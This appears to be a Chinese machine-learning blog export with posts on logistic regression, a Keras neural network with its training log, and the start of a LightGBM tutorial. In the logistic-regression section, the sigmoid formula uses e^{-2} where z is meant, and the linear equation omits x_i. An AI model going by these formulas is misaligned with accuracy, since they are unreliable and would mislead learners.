其中第一列代表预测为0类的概率，第二列代表预测为1类的概率，第三列代表预测为2类的概率。## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_train,train_predict))print(&#x27;The accuracy of the Logistic Regression is:&#x27;,metrics.accuracy_score(y_test,test_predict)) The test predict Probability of each class: [[1.03461737e-05 2.33279477e-02 9.76661706e-01] [9.69926591e-01 3.00732874e-02 1.21677000e-07] [2.09992549e-02 8.69156616e-01 1.09844129e-01] [3.61934872e-03 7.91979966e-01 2.04400686e-01] [7.90943209e-03 8.00605299e-01 1.91485269e-01] [7.30034956e-04 6.60508053e-01 3.38761912e-01] [1.68614211e-04 1.86322045e-01 8.13509341e-01] [1.06915331e-01 8.90815532e-01 2.26913671e-03] [9.46928071e-01 5.30707288e-02 1.20016060e-06] [9.62346385e-01 3.76532228e-02 3.91897297e-07] [1.19533386e-04 1.38823469e-01 8.61056998e-01] [8.78881880e-03 6.97207359e-01 2.94003822e-01] [9.73938143e-01 2.60617342e-02 1.22613839e-07] [1.78434056e-03 4.79518177e-01 5.18697483e-01] [5.56924345e-04 2.46776840e-01 7.52666235e-01] [9.83549842e-01 1.64500666e-02 9.13617272e-08] [1.65201476e-02 9.54672748e-01 2.88071041e-02] [8.99853722e-03 7.82707575e-01 2.08293888e-01] [2.98015029e-05 5.45900069e-02 9.45380192e-01] [9.35695863e-01 6.43039522e-02 1.85301368e-07] [9.80621190e-01 1.93787398e-02 7.00125265e-08] [1.68478817e-04 3.30167227e-01 6.69664294e-01] [3.54046168e-03 4.02267804e-01 5.94191734e-01] [9.70617284e-01 2.93824735e-02 2.42443971e-07] [2.56895209e-04 1.54631583e-01 8.45111521e-01] [3.48668493e-02 9.11966140e-01 5.31670110e-02] [1.47218849e-02 6.84038113e-01 3.01240002e-01] [9.46510460e-04 4.28641987e-01 5.70411502e-01] [9.64848137e-01 3.51516747e-02 1.87917886e-07] [9.70436779e-01 2.95624021e-02 8.18591621e-07]] The accuracy of the Logistic Regression is: 0.9833333333333333 The accuracy of the Logistic Regression is: 0.8666666666666667 12345678910## 查看混淆矩阵confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)print(&#x27;The confusion matrix result:\\n&#x27;,confusion_matrix_result)# 利用热力图对于结果进行可视化plt.figure(figsize=(8, 6))sns.heatmap(confusion_matrix_result, annot=True, cmap=&#x27;Blues&#x27;)plt.xlabel(&#x27;Predicted labels&#x27;)plt.ylabel(&#x27;True labels&#x27;)plt.show() The confusion matrix result: [[10 0 0] [ 0 8 2] [ 0 2 8]] # 重要知识点 逻辑回归 原理简介： Logistic 回归虽然名字里带 “回归”，但是它实际上是一种分类方法，主要用于两分类问题（即输出只有两种，分别代表两个类别），所以利用了 Logistic 函数（或称为 Sigmoid 函数），函数形式为： log(z)=11+e−2log(z) = \\frac {1}{1+e^{-2}} log(z)=1+e−21​ 其对应的函数图像可以表示如下: 12345678910import numpy as npimport matplotlib.pyplot as pltx = np.arange(-5,5,0.01)y = 1/(1+np.exp(-x))plt.plot(x,y)plt.xlabel(&#x27;z&#x27;)plt.ylabel(&#x27;y&#x27;)plt.grid()plt.show() ​ 通过上图我们可以发现 Logistic 函数是单调递增函数，并且在 z=0 的时候取值为 0.5，并且 logi (⋅) 函数的取值范围为 (0,1)。 而回归的基本方程为z=w0+∑iNwiz=w_0+\\sum_{i}^N{w_i}z=w0​+∑iN​wi​ 将回归方程写入其中为： p=p(y=1∣x,θ)=hθ(x,θ)=11+e−(w0+∑iNwixi)p=p(y=1|x,\\theta)=h_\\theta(x,\\theta)=\\frac{1}{1+e^{-(w_0+\\sum_i^N{w_ix_i})}} p=p(y=1∣x,θ)=hθ​(x,θ)=1+e−(w0​+∑iN​wi​xi​)1​ 所以，p(y=1∣x,θ)=hθ(x,θ)p(y=1|x,\\theta)=h_\\theta(x,\\theta)p(y=1∣x,θ)=hθ​(x,θ),p(y=0∣x,θ)=1−hθ(x,θ)p(y=0|x,\\theta)=1-h_\\theta(x,\\theta)p(y=0∣x,θ)=1−hθ​(x,θ) 逻辑回归从其原理上来说，逻辑回归其实是实现了一个决策边界：对于函数y=11+e−zy=\\frac1{1+e^{-z}}y=1+e−z1​, 当z=&gt;0z =&gt; 0z=&gt;0 时，y=&gt;0.5y =&gt; 0.5y=&gt;0.5, 分类为 1，当z&lt;0z &lt; 0z&lt;0 时，y&lt;0.5y &lt; 0.5y&lt;0.5, 分类为 0，其对应的yyy 值我们可以视为类别 1 的概率预测值. 对于模型的训练而言：实质上来说就是利用数据求解出对应的模型的特定的www。从而得到一个针对于当前数据的特征逻辑回归模型。 而对于多分类而言，将多个二分类的逻辑回归组合，即可实现多分类。 END","categories":[{"name":"天池机器学习入门","slug":"天池机器学习入门","permalink":"http://example.com/categories/%E5%A4%A9%E6%B1%A0%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"BP神经网络","slug":"机器学习/机器学习课程(魏)/BP","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:52:43.394Z","comments":true,"path":"2021/11/08/机器学习/机器学习课程(魏)/BP/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/BP/","excerpt":"","text":"123456import tensorflow as tffrom tensorflow import kerasimport numpy as npimport matplotlib.pyplot as pltimport scipy.io as sio 12345678910111213141516171819fashion_mnist=sio.loadmat(&#x27;fashion_mnist.mat&#x27;)train_img=fashion_mnist[&#x27;train&#x27;]train_imglabels=fashion_mnist[&#x27;trainlabels&#x27;]test_img=fashion_mnist[&#x27;test&#x27;]test_imglabels=fashion_mnist[&#x27;testlabels&#x27;]input1=keras.layers.Input(shape=train_img.shape[1:])hidden1=keras.layers.Dense(100,activation=&quot;tanh&quot;)(input1)hidden2=keras.layers.Dense(120,activation=&quot;tanh&quot;)(hidden1)concat=keras.layers.Concatenate()([input1,hidden2])output=keras.layers.Dense(10,activation=&quot;softmax&quot;)(concat)model=keras.Model(inputs=[input1],outputs=[output])model.compile(loss=&quot;sparse_categorical_crossentropy&quot;,optimizer=keras.optimizers.SGD(lr=0.005),metrics=[&#x27;accuracy&#x27;])x_valid,x_train=train_img[:5000]/255,train_img[5000:]/255y_valid,y_train=train_imglabels[:5000],train_imglabels[5000:]model.fit(x_train,y_train,batch_size=2500,epochs=100,validation_data=(x_valid,y_valid),verbose=1) WARNING:tensorflow:From c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\tensorflow_core\\python\\ops\\resource_variable_ops.py:1630: calling BaseResourceVariable.__init__ (from tensorflow.python.ops.resource_variable_ops) with constraint is deprecated and will be removed in a future version. Instructions for updating: If using Keras pass *_constraint arguments to layers. Train on 55000 samples, validate on 5000 samples Epoch 1/100 55000/55000 [==============================] - 3s 46us/sample - loss: 2.2687 - acc: 0.1840 - val_loss: 2.0692 - val_acc: 0.2996 Epoch 2/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.9678 - acc: 0.3960 - val_loss: 1.8557 - val_acc: 0.4844 Epoch 3/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.7842 - acc: 0.5295 - val_loss: 1.6939 - val_acc: 0.5776 Epoch 4/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.6412 - acc: 0.5905 - val_loss: 1.5654 - val_acc: 0.6198 Epoch 5/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.5266 - acc: 0.6213 - val_loss: 1.4618 - val_acc: 0.6430 Epoch 6/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.4337 - acc: 0.6395 - val_loss: 1.3775 - val_acc: 0.6570 Epoch 7/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.3572 - acc: 0.6528 - val_loss: 1.3078 - val_acc: 0.6666 Epoch 8/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.2934 - acc: 0.6628 - val_loss: 1.2492 - val_acc: 0.6752 Epoch 9/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.2395 - acc: 0.6706 - val_loss: 1.1996 - val_acc: 0.6824 Epoch 10/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.1935 - acc: 0.6769 - val_loss: 1.1571 - val_acc: 0.6874 Epoch 11/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.1537 - acc: 0.6833 - val_loss: 1.1201 - val_acc: 0.6924 Epoch 12/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.1190 - acc: 0.6876 - val_loss: 1.0877 - val_acc: 0.6988 Epoch 13/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.0885 - acc: 0.6928 - val_loss: 1.0591 - val_acc: 0.7032 Epoch 14/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.0614 - acc: 0.6970 - val_loss: 1.0337 - val_acc: 0.7074 Epoch 15/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.0372 - acc: 0.7007 - val_loss: 1.0109 - val_acc: 0.7110 Epoch 16/100 55000/55000 [==============================] - 2s 44us/sample - loss: 1.0154 - acc: 0.7045 - val_loss: 0.9903 - val_acc: 0.7146 Epoch 17/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.9957 - acc: 0.7075 - val_loss: 0.9716 - val_acc: 0.7184 Epoch 18/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.9777 - acc: 0.7114 - val_loss: 0.9546 - val_acc: 0.7220 Epoch 19/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.9613 - acc: 0.7147 - val_loss: 0.9390 - val_acc: 0.7248 Epoch 20/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.9462 - acc: 0.7171 - val_loss: 0.9246 - val_acc: 0.7268 Epoch 21/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.9323 - acc: 0.7196 - val_loss: 0.9113 - val_acc: 0.7296 Epoch 22/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.9194 - acc: 0.7229 - val_loss: 0.8990 - val_acc: 0.7320 Epoch 23/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.9073 - acc: 0.7255 - val_loss: 0.8875 - val_acc: 0.7338 Epoch 24/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.8961 - acc: 0.7285 - val_loss: 0.8767 - val_acc: 0.7366 Epoch 25/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.8856 - acc: 0.7301 - val_loss: 0.8665 - val_acc: 0.7400 Epoch 26/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.8757 - acc: 0.7328 - val_loss: 0.8570 - val_acc: 0.7432 Epoch 27/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.8664 - acc: 0.7349 - val_loss: 0.8480 - val_acc: 0.7456 Epoch 28/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.8576 - acc: 0.7374 - val_loss: 0.8396 - val_acc: 0.7476 Epoch 29/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.8493 - acc: 0.7391 - val_loss: 0.8315 - val_acc: 0.7498 Epoch 30/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.8413 - acc: 0.7415 - val_loss: 0.8239 - val_acc: 0.7516 Epoch 31/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.8338 - acc: 0.7430 - val_loss: 0.8166 - val_acc: 0.7524 Epoch 32/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.8266 - acc: 0.7444 - val_loss: 0.8097 - val_acc: 0.7544 Epoch 33/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.8198 - acc: 0.7457 - val_loss: 0.8030 - val_acc: 0.7562 Epoch 34/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.8132 - acc: 0.7475 - val_loss: 0.7966 - val_acc: 0.7580 Epoch 35/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.8069 - acc: 0.7493 - val_loss: 0.7906 - val_acc: 0.7582 Epoch 36/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.8009 - acc: 0.7509 - val_loss: 0.7847 - val_acc: 0.7604 Epoch 37/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7951 - acc: 0.7519 - val_loss: 0.7791 - val_acc: 0.7608 Epoch 38/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7896 - acc: 0.7535 - val_loss: 0.7737 - val_acc: 0.7638 Epoch 39/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7842 - acc: 0.7550 - val_loss: 0.7684 - val_acc: 0.7650 Epoch 40/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7790 - acc: 0.7564 - val_loss: 0.7634 - val_acc: 0.7660 Epoch 41/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7740 - acc: 0.7574 - val_loss: 0.7585 - val_acc: 0.7676 Epoch 42/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7692 - acc: 0.7592 - val_loss: 0.7538 - val_acc: 0.7684 Epoch 43/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7645 - acc: 0.7607 - val_loss: 0.7493 - val_acc: 0.7696 Epoch 44/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7600 - acc: 0.7619 - val_loss: 0.7449 - val_acc: 0.7714 Epoch 45/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7556 - acc: 0.7634 - val_loss: 0.7406 - val_acc: 0.7738 Epoch 46/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7514 - acc: 0.7646 - val_loss: 0.7365 - val_acc: 0.7750 Epoch 47/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7472 - acc: 0.7656 - val_loss: 0.7324 - val_acc: 0.7758 Epoch 48/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7432 - acc: 0.7671 - val_loss: 0.7286 - val_acc: 0.7770 Epoch 49/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7393 - acc: 0.7678 - val_loss: 0.7247 - val_acc: 0.7784 Epoch 50/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7355 - acc: 0.7697 - val_loss: 0.7210 - val_acc: 0.7792 Epoch 51/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7319 - acc: 0.7702 - val_loss: 0.7174 - val_acc: 0.7802 Epoch 52/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7283 - acc: 0.7711 - val_loss: 0.7139 - val_acc: 0.7812 Epoch 53/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7248 - acc: 0.7726 - val_loss: 0.7105 - val_acc: 0.7816 Epoch 54/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7213 - acc: 0.7733 - val_loss: 0.7072 - val_acc: 0.7820 Epoch 55/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7180 - acc: 0.7739 - val_loss: 0.7039 - val_acc: 0.7828 Epoch 56/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7148 - acc: 0.7749 - val_loss: 0.7007 - val_acc: 0.7830 Epoch 57/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7116 - acc: 0.7755 - val_loss: 0.6976 - val_acc: 0.7840 Epoch 58/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7085 - acc: 0.7766 - val_loss: 0.6946 - val_acc: 0.7840 Epoch 59/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7054 - acc: 0.7775 - val_loss: 0.6917 - val_acc: 0.7846 Epoch 60/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.7025 - acc: 0.7783 - val_loss: 0.6888 - val_acc: 0.7858 Epoch 61/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6996 - acc: 0.7792 - val_loss: 0.6860 - val_acc: 0.7860 Epoch 62/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6967 - acc: 0.7801 - val_loss: 0.6831 - val_acc: 0.7874 Epoch 63/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6940 - acc: 0.7806 - val_loss: 0.6804 - val_acc: 0.7874 Epoch 64/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6913 - acc: 0.7816 - val_loss: 0.6778 - val_acc: 0.7896 Epoch 65/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6886 - acc: 0.7821 - val_loss: 0.6752 - val_acc: 0.7900 Epoch 66/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6860 - acc: 0.7827 - val_loss: 0.6726 - val_acc: 0.7908 Epoch 67/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6834 - acc: 0.7835 - val_loss: 0.6701 - val_acc: 0.7916 Epoch 68/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6809 - acc: 0.7839 - val_loss: 0.6676 - val_acc: 0.7918 Epoch 69/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6785 - acc: 0.7844 - val_loss: 0.6652 - val_acc: 0.7934 Epoch 70/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6760 - acc: 0.7853 - val_loss: 0.6629 - val_acc: 0.7932 Epoch 71/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6737 - acc: 0.7859 - val_loss: 0.6606 - val_acc: 0.7942 Epoch 72/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6713 - acc: 0.7860 - val_loss: 0.6583 - val_acc: 0.7942 Epoch 73/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6691 - acc: 0.7869 - val_loss: 0.6560 - val_acc: 0.7950 Epoch 74/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6668 - acc: 0.7873 - val_loss: 0.6539 - val_acc: 0.7956 Epoch 75/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6646 - acc: 0.7878 - val_loss: 0.6517 - val_acc: 0.7958 Epoch 76/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6625 - acc: 0.7886 - val_loss: 0.6495 - val_acc: 0.7960 Epoch 77/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6603 - acc: 0.7890 - val_loss: 0.6475 - val_acc: 0.7970 Epoch 78/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6582 - acc: 0.7898 - val_loss: 0.6454 - val_acc: 0.7974 Epoch 79/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6562 - acc: 0.7902 - val_loss: 0.6434 - val_acc: 0.7980 Epoch 80/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6542 - acc: 0.7908 - val_loss: 0.6414 - val_acc: 0.7982 Epoch 81/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6522 - acc: 0.7912 - val_loss: 0.6395 - val_acc: 0.7998 Epoch 82/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6502 - acc: 0.7916 - val_loss: 0.6376 - val_acc: 0.7996 Epoch 83/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6483 - acc: 0.7920 - val_loss: 0.6357 - val_acc: 0.8002 Epoch 84/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6464 - acc: 0.7925 - val_loss: 0.6339 - val_acc: 0.8010 Epoch 85/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6445 - acc: 0.7929 - val_loss: 0.6320 - val_acc: 0.8010 Epoch 86/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6427 - acc: 0.7935 - val_loss: 0.6302 - val_acc: 0.8016 Epoch 87/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6409 - acc: 0.7937 - val_loss: 0.6284 - val_acc: 0.8014 Epoch 88/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6391 - acc: 0.7940 - val_loss: 0.6267 - val_acc: 0.8020 Epoch 89/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6374 - acc: 0.7945 - val_loss: 0.6250 - val_acc: 0.8022 Epoch 90/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6356 - acc: 0.7946 - val_loss: 0.6233 - val_acc: 0.8032 Epoch 91/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6340 - acc: 0.7953 - val_loss: 0.6217 - val_acc: 0.8040 Epoch 92/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6323 - acc: 0.7957 - val_loss: 0.6199 - val_acc: 0.8050 Epoch 93/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6306 - acc: 0.7962 - val_loss: 0.6183 - val_acc: 0.8056 Epoch 94/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6290 - acc: 0.7963 - val_loss: 0.6168 - val_acc: 0.8056 Epoch 95/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6274 - acc: 0.7969 - val_loss: 0.6152 - val_acc: 0.8056 Epoch 96/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6258 - acc: 0.7974 - val_loss: 0.6137 - val_acc: 0.8064 Epoch 97/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6242 - acc: 0.7978 - val_loss: 0.6121 - val_acc: 0.8066 Epoch 98/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6227 - acc: 0.7986 - val_loss: 0.6106 - val_acc: 0.8068 Epoch 99/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6212 - acc: 0.7985 - val_loss: 0.6091 - val_acc: 0.8080 Epoch 100/100 55000/55000 [==============================] - 2s 44us/sample - loss: 0.6197 - acc: 0.7992 - val_loss: 0.6077 - val_acc: 0.8074 &lt;tensorflow.python.keras.callbacks.History at 0x16f1a0a3a20&gt; 1","categories":[{"name":"机器学习课程(魏)","slug":"机器学习课程-魏","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B-%E9%AD%8F/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"基于LightGBM的分类预测","slug":"机器学习/天池/基于LightGBM的分类预测","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:27:23.565Z","comments":true,"path":"2021/11/08/机器学习/天池/基于LightGBM的分类预测/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8ELightGBM%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/","excerpt":"","text":"# 1. 基于 LightGBM 的分类预测 # 1.1 LightGBM 的介绍 LightGBM 是 2017 年由微软推出的可扩展机器学习系统，是微软旗下 DMKT 的一个开源项目，由 2014 年首届阿里巴巴大数据竞赛获胜者之一柯国霖老师带领开发。它是一款基于 GBDT（梯度提升决策树）算法的分布式梯度提升框架，为了满足缩短模型计算时间的需求，LightGBM 的设计思路主要集中在减小数据对内存与计算性能的使用，以及减少多机器并行计算时的通讯代价。 LightGBM 可以看作是 XGBoost 的升级豪华版，在获得与 XGBoost 近似精度的同时，又提供了更快的训练速度与更少的内存消耗。正如其名字中的 Light 所蕴含的那样，LightGBM 在大规模数据集上跑起来更加优雅轻盈，一经推出便成为各种数据竞赛中刷榜夺冠的神兵利器。 LightGBM 的主要优点： 简单易用。提供了主流的 Python\\C++\\R 语言接口，用户可以轻松使用 LightGBM 建模并获得相当不错的效果。 高效可扩展。在处理大规模数据集时高效迅速、高准确度，对内存等硬件资源要求不高。 鲁棒性强。相较于深度学习模型不需要精细调参便能取得近似的效果。 LightGBM 直接支持缺失值与类别特征，无需对数据额外进行特殊处理 LightGBM 的主要缺点： 相对于深度学习模型无法对时空位置建模，不能很好地捕获图像、语音、文本等高维数据。 在拥有海量训练数据，并能找到合适的深度学习模型时，深度学习的精度可以遥遥领先 LightGBM。 # 1.2 LightGBM 的应用 LightGBM 在机器学习与数据挖掘领域有着极为广泛的应用。据统计 LightGBM 模型自 2016 到 2019 年在 Kaggle 平台上累积获得数据竞赛前三名三十余次，其中包括 CIKM2017 AnalytiCup、IEEE Fraud Detection 等知名竞赛。这些竞赛来源于各行各业的真实业务，这些竞赛成绩表明 LightGBM 具有很好的可扩展性，在各类不同问题上都可以取得非常好的效果。 同时，LightGBM 还被成功应用在工业界与学术界的各种问题中。例如金融风控、购买行为识别、交通流量预测、环境声音分类、基因分类、生物成分分析等诸多领域。虽然领域相关的数据分析和特性工程在这些解决方案中也发挥了重要作用，但学习者与实践者对 LightGBM 的一致选择表明了这一软件包的影响力与重要性。 # 2. 实验室手册 # 2.1 学习目标 了解 LightGBM 的参数与相关知识 掌握 LightGBM 的 Python 调用并将其运用到英雄联盟游戏胜负预测数据集上 # 2.2 代码流程 # Part1 基于英雄联盟数据集的 LightGBM 分类实践 Step1: 库函数导入 Step2: 数据读取 / 载入 Step3: 数据信息简单查看 Step4: 可视化描述 Step5: 利用 LightGBM 进行训练与预测 Step6: 利用 LightGBM 进行特征选择 Step7: 通过调整参数获得更好的效果 # 2.3 算法实战 # 2.3.1 基于英雄联盟数据集的 LightGBM 分类实战 在实践的最开始，我们首先需要导入一些基础的函数库包括：numpy （Python 进行科学计算的基础软件包），pandas（pandas 是一种快速，强大，灵活且易于使用的开源数据分析和处理工具），matplotlib 和 seaborn 绘图。 12#下载需要用到的数据集!wget https://tianchi-media.oss-cn-beijing.aliyuncs.com/DSW/8LightGBM/high_diamond_ranked_10min.csv 'wget' 不是内部或外部命令，也不是可运行的程序 或批处理文件。 Step1: 库函数导入 1234567## 基础函数库import numpy as np import pandas as pd## 绘图函数库import matplotlib.pyplot as pltimport seaborn as sns 本次我们选择英雄联盟数据集进行 LightGBM 的场景体验。英雄联盟是 2009 年美国拳头游戏开发的 MOBA 竞技网游，在每局比赛中蓝队与红队在同一个地图进行作战，游戏的目标是破坏敌方队伍的防御塔，进而摧毁敌方的水晶枢纽，拿下比赛的胜利。 现在共有 9881 场英雄联盟韩服钻石段位以上的排位比赛数据，数据提供了在十分钟时的游戏状态，包括击杀数、死亡数、金币数量、经验值、等级…… 等信息。列 blueWins 是数据的标签，代表了本场比赛是否为蓝队获胜。 数据的各个特征描述如下： 特征名称 特征意义 取值范围 WardsPlaced 插眼数量 整数 WardsDestroyed 拆眼数量 整数 FirstBlood 是否获得首次击杀 整数 Kills 击杀英雄数量 整数 Deaths 死亡数量 整数 Assists 助攻数量 整数 EliteMonsters 击杀大型野怪数量 整数 Dragons 击杀史诗野怪数量 整数 Heralds 击杀峡谷先锋数量 整数 TowersDestroyed 推塔数量 整数 TotalGold 总经济 整数 AvgLevel 平均英雄等级 浮点数 TotalExperience 英雄总经验 整数 TotalMinionsKilled 英雄补兵数量 整数 TotalJungleMinionsKilled 英雄击杀野怪数量 整数 GoldDiff 经济差距 整数 ExperienceDiff 经验差距 整数 CSPerMin 分均补刀 浮点数 GoldPerMin 分均经济 浮点数 Step2: 数据读取 / 载入 1234## 我们利用Pandas自带的read_csv函数读取并转化为DataFrame格式df = pd.read_csv(&#x27;./high_diamond_ranked_10min.csv&#x27;)y = df.blueWins Step3: 数据信息简单查看 12## 利用.info()查看数据的整体信息df.info() &lt;class 'pandas.core.frame.DataFrame'&gt; RangeIndex: 9879 entries, 0 to 9878 Data columns (total 40 columns): # Column Non-Null Count Dtype --- ------ -------------- ----- 0 gameId 9879 non-null int64 1 blueWins 9879 non-null int64 2 blueWardsPlaced 9879 non-null int64 3 blueWardsDestroyed 9879 non-null int64 4 blueFirstBlood 9879 non-null int64 5 blueKills 9879 non-null int64 6 blueDeaths 9879 non-null int64 7 blueAssists 9879 non-null int64 8 blueEliteMonsters 9879 non-null int64 9 blueDragons 9879 non-null int64 10 blueHeralds 9879 non-null int64 11 blueTowersDestroyed 9879 non-null int64 12 blueTotalGold 9879 non-null int64 13 blueAvgLevel 9879 non-null float64 14 blueTotalExperience 9879 non-null int64 15 blueTotalMinionsKilled 9879 non-null int64 16 blueTotalJungleMinionsKilled 9879 non-null int64 17 blueGoldDiff 9879 non-null int64 18 blueExperienceDiff 9879 non-null int64 19 blueCSPerMin 9879 non-null float64 20 blueGoldPerMin 9879 non-null float64 21 redWardsPlaced 9879 non-null int64 22 redWardsDestroyed 9879 non-null int64 23 redFirstBlood 9879 non-null int64 24 redKills 9879 non-null int64 25 redDeaths 9879 non-null int64 26 redAssists 9879 non-null int64 27 redEliteMonsters 9879 non-null int64 28 redDragons 9879 non-null int64 29 redHeralds 9879 non-null int64 30 redTowersDestroyed 9879 non-null int64 31 redTotalGold 9879 non-null int64 32 redAvgLevel 9879 non-null float64 33 redTotalExperience 9879 non-null int64 34 redTotalMinionsKilled 9879 non-null int64 35 redTotalJungleMinionsKilled 9879 non-null int64 36 redGoldDiff 9879 non-null int64 37 redExperienceDiff 9879 non-null int64 38 redCSPerMin 9879 non-null float64 39 redGoldPerMin 9879 non-null float64 dtypes: float64(6), int64(34) memory usage: 3.0 MB 12## 进行简单的数据查看，我们可以利用 .head() 头部.tail()尾部df.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; gameId blueWins blueWardsPlaced blueWardsDestroyed blueFirstBlood blueKills blueDeaths blueAssists blueEliteMonsters blueDragons ... redTowersDestroyed redTotalGold redAvgLevel redTotalExperience redTotalMinionsKilled redTotalJungleMinionsKilled redGoldDiff redExperienceDiff 